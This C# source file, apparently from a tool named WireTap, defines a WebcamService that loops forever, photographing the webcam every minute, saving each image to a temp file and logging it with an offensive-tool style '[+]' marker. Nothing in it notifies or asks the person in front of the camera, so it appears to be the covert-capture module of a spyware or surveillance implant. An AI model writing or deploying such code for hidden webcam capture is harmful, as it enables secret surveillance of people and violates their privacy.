namespace WireTap.Service
{
    using System;
    using System.Threading.Tasks;

    internal class WebcamService : ServiceBase, IService
    {
        internal override async Task ExecuteAsync()
        {
            Console.WriteLine("WebcamService : StartWebCameraServiceAsync");

            while (true)
            {
                try
                {
                    Console.WriteLine("WebcamService : Inside captureWebCam");
                    var tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-", "webcam");
                    WebCam.CaptureImage(tempFile);
                    Console.WriteLine("WebcamService : [+] Webcam captured at: {0}", tempFile);
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(string.Concat("WebcamService : ", ex.Message, '\n' + ex.StackTrace));
                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }
    }
}